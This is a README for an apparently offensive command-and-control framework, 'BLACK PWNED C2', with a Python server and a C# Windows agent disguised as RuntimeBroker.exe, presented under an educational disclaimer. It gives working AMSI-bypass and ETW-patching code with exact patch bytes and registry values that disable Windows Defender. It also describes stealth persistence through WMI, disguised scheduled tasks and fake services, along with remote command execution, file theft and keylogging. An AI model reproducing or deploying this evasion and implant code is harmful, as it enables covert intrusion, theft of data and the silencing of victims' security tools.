# BLACK PWNED C2 Framework

![License](https://img.shields.io/badge/License-Educational%20Use%20Only-red)
![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey)
![Version](https://img.shields.io/badge/Version-2.0-brightgreen)

<div align="center">
  <img src="https://github.com/user-attachments/assets/1855036e-bff7-4ce8-bc1d-cd8f3edb8704" alt="Banner" />
</div>

---

## ⚠️ DISCLAIMER - READ CAREFULLY

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                     EDUCATIONAL PURPOSE ONLY - STRICT ADVISORY                 ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  This software is provided SOLELY for:                                         ║
║    • Academic research in cybersecurity                                        ║
║    • Authorized penetration testing in controlled environments                  ║
║    • Red Team / Blue Team training exercises                                   ║
║    • Understanding advanced persistent threat (APT) methodologies              ║
║                                                                               ║
║  STRICTLY PROHIBITED:                                                          ║
║    • Unauthorized access to computer systems                                   ║
║    • Malicious activities of any kind                                          ║
║    • Deployment on systems you do not own or have explicit written permission  ║
║    • Use in production environments                                            ║
║                                                                               ║
║  The authors assume NO LIABILITY for misuse. Users are solely responsible      ║
║  for ensuring compliance with all applicable laws and regulations.             ║
║                                                                               ║
║  This is an APT SIMULATION PLATFORM designed for defensive training.           ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

---

## 📋 Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Components](#components)
- [Features](#features)
- [Technical Specifications](#technical-specifications)
- [Installation](#installation)
- [Usage Guide](#usage-guide)
- [Command Reference](#command-reference)
- [Security Mechanisms](#security-mechanisms)
- [Evasion Techniques](#evasion-techniques)
- [Development Notes](#development-notes)
- [Legal Compliance](#legal-compliance)

---

## 🔍 Overview

**BLACK PWNED C2** is an advanced Command & Control framework designed for **educational simulation** of Advanced Persistent Threat (APT) tactics, techniques, and procedures (TTPs). The framework implements realistic C2 infrastructure with AES-256-GCM encryption, asynchronous communication, and sophisticated Windows Defender evasion techniques.

### Core Objectives

| Objective | Description |
|-----------|-------------|
| **Educational Simulation** | Provide realistic environment for cybersecurity training |
| **Defensive Research** | Enable blue teams to study C2 behaviors and detection methods |
| **TTP Demonstration** | Showcase modern APT techniques in controlled settings |
| **Tool Development** | Reference implementation for security tool developers |

---

## 🏗 Architecture

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/2d2764b1-a25d-424e-a32b-0adc6e591ff7" />


### Communication Flow

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/3f58da34-750d-41ad-a9b7-d292cde6f915" />


---

## 🧩 Components

### 1. C2 Server (`BlackExploitC2.py`)

The server component is written in Python 3.8+ and provides:

| Module | Class | Responsibility |
|--------|-------|----------------|
| Core Engine | `AdvancedC2Handler` | Handles agent connections, encryption, task queuing |
| Interactive Console | `C2Console` | Operator interface with command completion |
| Task Management | `Task`, `TaskType` | Task definition and scheduling |
| Agent Registry | `Agent`, `AgentStatus` | Agent tracking and state management |

### 2. Windows Agent (`svchost_exp.cs`)

The agent component is written in C# and implements:

| Module | Method | Purpose |
|--------|--------|---------|
| AMSI Bypass | `PatchAMSI()` | Memory patching of AmsiScanBuffer |
| ETW Patching | `PatchETW()` | Disable Event Tracing for Windows |
| Defender Control | `DisableRealTimeProtection()` | Registry/PowerShell manipulation |
| Persistence | `CreateWMIEventSubscription()` | WMI-based stealth persistence |
| Process Hiding | `HideProcess()`, `MigrateToTrustedProcess()` | Evasion techniques |

---

## ✨ Features

### C2 Server Features

| Feature | Implementation | Status |
|---------|----------------|--------|
| **Asynchronous I/O** | Python `asyncio` | ✅ Complete |
| **AES-256-GCM Encryption** | `cryptography` library | ✅ Complete |
| **Multi-Agent Support** | Dictionary-based registry | ✅ Complete |
| **Task Queue System** | Per-agent FIFO queues | ✅ Complete |
| **Interactive Console** | Readline + Colorama | ✅ Complete |
| **Agent Heartbeat** | Timestamp tracking | ✅ Complete |
| **Command Broadcasting** | Multi-agent execution | ✅ Complete |
| **File Transfer** | Upload/Download with Base64 | ✅ Complete |
| **Session Management** | Interact/Back/Kill | ✅ Complete |
| **Statistics Dashboard** | Real-time metrics | ✅ Complete |

### Agent Features

| Feature | Implementation | Status |
|---------|----------------|--------|
| **AMSI Bypass** | Memory patching | ✅ Complete |
| **ETW Patching** | Function hooking | ✅ Complete |
| **Defender Disable** | Registry + PowerShell | ✅ Complete |
| **Defender Exclusions** | Path/Process/Extension | ✅ Complete |
| **WMI Persistence** | Event subscription | ✅ Complete |
| **Scheduled Task** | Legitimate naming | ✅ Complete |
| **Process Migration** | Trusted process injection | ✅ Complete |
| **Jitter Support** | Random sleep variation | ✅ Complete |
| **Auto-Reactivation Detection** | Registry monitoring | ✅ Complete |
| **File Hiding** | System + Hidden attributes | ✅ Complete |

---

## 🔧 Technical Specifications

### Encryption Details

```
Algorithm: AES-256-GCM (Galois/Counter Mode)
Key Size: 256 bits (32 bytes)
IV Size: 96 bits (12 bytes) - Random per message
Tag Size: 128 bits (16 bytes) - Authentication tag

Key Derivation: Static PSK (Educational - Production would use ECDH)

Payload Structure:
┌──────────┬──────────────┬─────────────────┐
│ IV (12B) │ Tag (16B)    │ Ciphertext      │
├──────────┼──────────────┼─────────────────┤
│ Random   │ Auth Tag     │ AES-GCM Output  │
└──────────┴──────────────┴─────────────────┘
```

### Network Protocol

```
Beacon Format (Agent → C2):
{
    "id": "<agent_identifier>",
    "hostname": "<system_hostname>",
    "username": "<current_user>",
    "os": "<os_version_string>",
    "capabilities": ["execute", "upload", "download", ...],
    "output": "<command_output>",  // Optional
    "task_id": "<completed_task_id>"  // Optional
}

Task Format (C2 → Agent):
{
    "command": "execute|upload|download|sleep|exit",
    "args": ["arg1", "arg2", ...],
    "task_id": "<unique_task_id>",
    "timeout": 60
}
```

### System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **C2 Server OS** | Linux/Windows/macOS | Ubuntu 20.04+ |
| **Python Version** | 3.8 | 3.11+ |
| **Agent OS** | Windows 10/11 | Windows 10/11 Pro |
| **.NET Framework** | 4.5 | 4.8 |
| **Memory** | 512 MB | 2+ GB |

---

## 📦 Installation

### C2 Server Setup

```bash
# Clone repository (example)
git clone https://github.com/example/black-pwned-c2
cd black-pwned-c2

# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # Linux/macOS
# venv\Scripts\activate   # Windows

# Install dependencies
pip install -r requirements.txt
```

**requirements.txt:**
```
cryptography>=41.0.0
colorama>=0.4.6
```

### Agent Compilation

```powershell
# Compile using csc (Visual Studio Build Tools)
csc /target:exe /out:RuntimeBroker.exe /platform:x64 /optimize+ svchost_exp.cs

# Or using MSBuild
msbuild svchost_exp.csproj /p:Configuration=Release /p:Platform=x64
```

### Configuration

Edit the following variables in `BlackExploitC2.py`:

```python
# C2 Server Configuration
host = '0.0.0.0'  # Listen on all interfaces
port = 8080       # Default port

# Pre-Shared Key (CHANGE FOR YOUR ENVIRONMENT)
PSK = b'JDEXPLOIT_APT_SIMULATION_KEY_32B'  # Exactly 32 bytes required
```

Edit the following variables in `svchost_exp.cs`:

```csharp
// Agent Configuration
private static readonly string C2_SERVER = "192.168.1.100";  // Your C2 IP
private static readonly int C2_PORT = 8080;
private static readonly byte[] AES_KEY = Encoding.UTF8.GetBytes("JDEXPLOIT_APT_SIMULATION_KEY_32B");
```

---

## 📖 Usage Guide

### Starting the C2 Server

```bash
# Activate virtual environment first
python3 BlackExploitC2.py
```

Expected output:
```
██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝██║     ███████║██║     █████╔╝     ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ 
╔══════════════════════════════════════════════════════════════════════════════════════╗
║                    ADVANCED COMMAND & CONTROL FRAMEWORK v2.0                           ║
║                  [APT Simulation Platform - For Educational Use Only]                  ║
╚══════════════════════════════════════════════════════════════════════════════════════╝

[System Initialized] 2024-01-15 10:30:45
[Active Listeners] HTTPS/0.0.0.0:8080
[Encryption] AES-256-GCM | PSK: JDEXPLOIT_...
================================================================================

BLACKPWNED> 
```

### Deploying Agent (Educational Lab Only)

```powershell
# In controlled lab environment
.\RuntimeBroker.exe
```

### Interactive Session Example

```
BLACKPWNED> agents

╔══════════════════════════════════════════════════════════════════════════════╗
║  ID         Hostname             Username        OS              Last Seen      ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ 🟢 4A7B9C1D  LAB-WIN11           researcher      Windows 11 Pro  5s ago        ║
║ 🟢 8F2E6D4C  LAB-WIN10           analyst         Windows 10 Ent  12s ago       ║
╚══════════════════════════════════════════════════════════════════════════════╝

BLACKPWNED> interact 4A7B9C1D
[+] Now interacting with 4A7B9C1D

Agent Details:
  Hostname: LAB-WIN11
  Username: researcher
  OS: Windows 11 Pro
  IP: 192.168.1.50
  Capabilities: execute, upload, download, screenshot, keylog, persist

BLACKPWNED [4A7B9C1D]> execute whoami /all
[+] Task queued: whoami /all
[*] Task dispatched to 4A7B9C1D: execute
[>] 4A7B9C1D:
lab-win11\researcher
SID: S-1-5-21-123456789-1234567890-123456789-1001
Groups: BUILTIN\Administrators, Everyone, ...
```

---

## 📚 Command Reference

### Global Commands

| Command | Syntax | Description |
|---------|--------|-------------|
| `help` | `help` | Display comprehensive help menu |
| `agents` | `agents` | List all connected agents with status |
| `interact` | `interact <agent_id>` | Begin interactive session with agent |
| `broadcast` | `broadcast <command>` | Execute command on all agents |
| `stats` | `stats` | Display C2 server statistics |
| `clear` | `clear` | Clear console screen |
| `exit` | `exit` | Gracefully shutdown C2 framework |

### Agent-Specific Commands (Within Interact)

| Command | Syntax | Description |
|---------|--------|-------------|
| `execute` | `execute <command>` | Run system command on agent |
| `upload` | `upload <local> <remote>` | Transfer file to agent |
| `download` | `download <remote> <local>` | Retrieve file from agent |
| `sleep` | `sleep <seconds> [jitter%]` | Configure beacon interval |
| `info` | `info` | Display detailed agent information |
| `tasks` | `tasks` | Show pending tasks for agent |
| `kill` | `kill` | Terminate agent session |
| `back` | `back` | Exit interactive session |

### Task Types Reference

| Task Type | Description | Example Arguments |
|-----------|-------------|-------------------|
| `execute` | Command execution | `["cmd.exe", "/c", "dir"]` |
| `upload` | File upload | `["C:\\temp\\file.txt", "<base64_content>"]` |
| `download` | File download | `["C:\\sensitive.docx", "localfile.docx"]` |
| `sleep` | Beacon configuration | `["10", "20"]` |
| `exit` | Agent termination | `[]` |

---

## 🔒 Security Mechanisms

### Cryptographic Implementation

```python
class EncryptionDetails:
    """
    AES-256-GCM Implementation Details
    """
    
    ALGORITHM = "AES-256-GCM"
    KEY_SIZE = 32  # bytes
    IV_SIZE = 12   # bytes (96 bits)
    TAG_SIZE = 16  # bytes (128 bits)
    
    KEY_DERIVATION = "PBKDF2-HMAC-SHA256"  # Framework support
    ITERATIONS = 100000  # For future implementation
    
    INTEGRITY_CHECK = True  # GCM provides AEAD
    REPLAY_PROTECTION = True  # Unique IV per message
```

### Authentication Flow

```
┌─────────────┐                                    ┌─────────────┐
│   Agent     │                                    │  C2 Server  │
└──────┬──────┘                                    └──────┬──────┘
       │                                                  │
       │  1. Generate Random IV (12 bytes)                │
       │                                                  │
       │  2. Encrypt Payload:                             │
       │     - Agent ID + System Info                     │
       │     - AES-256-GCM with PSK                       │
       │                                                  │
       │  3. Send: IV + Tag + Ciphertext                  │
       │ ─────────────────────────────────────────────► │
       │                                                  │
       │                    4. Verify GCM Tag             │
       │                    5. Decrypt with PSK           │
       │                    6. Register/Update Agent      │
       │                                                  │
       │                    7. Generate New IV            │
       │                    8. Encrypt Task Response      │
       │                                                  │
       │  9. Receive: IV + Tag + Ciphertext              │
       │ ◄───────────────────────────────────────────── │
       │                                                  │
       │  10. Verify Tag                                 │
       │  11. Decrypt Task                               │
       │  12. Execute Command                            │
       │                                                  │
```

---

## 🛡 Evasion Techniques

### AMSI Bypass (In-Memory Patching)

```csharp
/*
 * AMSI (Antimalware Scan Interface) Bypass
 * Technique: Patch AmsiScanBuffer to return E_INVALIDARG
 */
private static void PatchAMSI()
{
    // 1. Load amsi.dll into process memory
    IntPtr amsiLib = LoadLibrary("amsi.dll");
    
    // 2. Get address of AmsiScanBuffer export
    IntPtr amsiScanBufferAddr = GetProcAddress(amsiLib, "AmsiScanBuffer");
    
    // 3. Patch with: mov eax, 0x80070057; ret
    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    
    // 4. Change memory protection to RWX
    VirtualProtect(amsiScanBufferAddr, patch.Length, 0x40, out uint oldProtect);
    
    // 5. Apply patch and restore protection
    Marshal.Copy(patch, 0, amsiScanBufferAddr, patch.Length);
    VirtualProtect(amsiScanBufferAddr, patch.Length, oldProtect, out _);
}
```

### ETW (Event Tracing for Windows) Patching

```csharp
/*
 * ETW Patching
 * Purpose: Prevent logging of .NET assembly loads and PowerShell execution
 */
private static void PatchETW()
{
    IntPtr ntdll = LoadLibrary("ntdll.dll");
    IntPtr etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite");
    
    // Patch: xor rax, rax; ret
    byte[] patch = { 0x48, 0x31, 0xC0, 0xC3 };
    
    VirtualProtect(etwEventWriteAddr, patch.Length, 0x40, out uint oldProtect);
    Marshal.Copy(patch, 0, etwEventWriteAddr, patch.Length);
    VirtualProtect(etwEventWriteAddr, patch.Length, oldProtect, out _);
}
```

### Windows Defender Registry Modifications

| Registry Path | Value | Effect |
|---------------|-------|--------|
| `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender` | `DisableAntiSpyware = 1` | Disable Defender service |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection` | `DisableRealtimeMonitoring = 1` | Disable real-time scanning |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection` | `DisableBehaviorMonitoring = 1` | Disable behavior analysis |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection` | `DisableOnAccessProtection = 1` | Disable on-access scanning |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan` | `DisableArchiveScanning = 1` | Disable archive scanning |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Scan` | `DisableEmailScanning = 1` | Disable email scanning |

### Persistence Mechanisms

| Method | Implementation | Detection Difficulty |
|--------|----------------|---------------------|
| **WMI Event Subscription** | `__EventFilter` + `CommandLineEventConsumer` | High |
| **Scheduled Task** | Legitimate naming (`MicrosoftEdgeUpdateTaskMachine`) | Medium |
| **Registry Run Key** | Hidden + System attributes | Low |
| **Service Installation** | Masquerade as Windows service | Medium |

---

## 🔬 Development Notes

### Adding New Task Types

```python
# 1. Add to TaskType Enum
class TaskType(Enum):
    # ... existing ...
    SCREENSHOT = "screenshot"
    KEYLOG_START = "keylog_start"
    # NEW: Add your task type
    PORT_SCAN = "port_scan"

# 2. Add command handler in C2Console
async def cmd_portscan(self, args):
    """Port scanning command"""
    if not self.current_agent:
        self.c2.log_error("No agent selected")
        return
    
    target = args[0] if args else "127.0.0.1"
    ports = args[1] if len(args) > 1 else "1-1000"
    
    task = Task(
        id=str(uuid.uuid4())[:8],
        type=TaskType.PORT_SCAN,
        command="portscan",
        args=[target, ports]
    )
    
    self.c2.queue_task(self.current_agent, task)

# 3. Add to commands dictionary
self.commands['portscan'] = self.cmd_portscan
```

### Extending Agent Capabilities

```csharp
// 1. Add capability string to agent registration
capabilities.Add("port_scan");

// 2. Implement task handler
private static string HandlePortScanTask(string[] args)
{
    string target = args[0];
    string portRange = args[1];
    
    // Implementation
    StringBuilder results = new StringBuilder();
    // ... scanning logic ...
    
    return results.ToString();
}

// 3. Add to task router
switch (taskType)
{
    case "port_scan":
        result = HandlePortScanTask(args);
        break;
}
```

---

## ⚖️ Legal Compliance

### Authorized Use Cases

| Scenario | Permitted | Requirements |
|----------|-----------|--------------|
| **Academic Research** | ✅ Yes | Institutional approval |
| **Penetration Testing** | ✅ Yes | Written authorization from system owner |
| **Red Team Exercises** | ✅ Yes | Scope defined in contract |
| **Security Training** | ✅ Yes | Isolated lab environment |
| **Personal Learning** | ✅ Yes | Own systems only |
| **Bug Bounty Programs** | ✅ Yes | Program terms compliance |
| **Production Deployment** | ❌ No | N/A |
| **Unauthorized Access** | ❌ No | Criminal offense |

### Compliance Checklist

- [ ] Written authorization obtained for target systems
- [ ] Isolated network environment configured
- [ ] Data handling procedures documented
- [ ] Incident response plan prepared
- [ ] Scope and duration defined
- [ ] Reporting mechanism established
- [ ] Legal counsel consulted

### Responsible Disclosure

Security researchers discovering vulnerabilities in this framework are encouraged to:

1. Submit issues via private channels
2. Allow 90 days for remediation before public disclosure
3. Provide detailed reproduction steps
4. Include impact assessment

---

## 📄 License

```
Copyright (c) 2024 Educational Security Research

This software is provided for EDUCATIONAL PURPOSES ONLY.

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to use
the Software solely for educational, research, and authorized security testing
purposes, subject to the following conditions:

1. The above copyright notice and this permission notice shall be included in
   all copies or substantial portions of the Software.

2. The Software shall NOT be used for any malicious, unauthorized, or illegal
   activities.

3. The Software shall NOT be deployed on any system without explicit written
   authorization from the system owner.

4. The authors disclaim all liability for any damages, legal consequences, or
   other issues arising from the use or misuse of this Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
```

---

## 🙏 Acknowledgments

This framework draws inspiration from various open-source security tools and academic research in the field of offensive security. It is intended solely for educational advancement in cybersecurity defense techniques.

---

<div align="center">

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                          END OF DOCUMENTATION                                 ║
║                                                                               ║
║                 "Knowledge is power. Use it responsibly."                     ║
║                                                                               ║
║                         Version 1.0 | January 2026                            ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

</div>
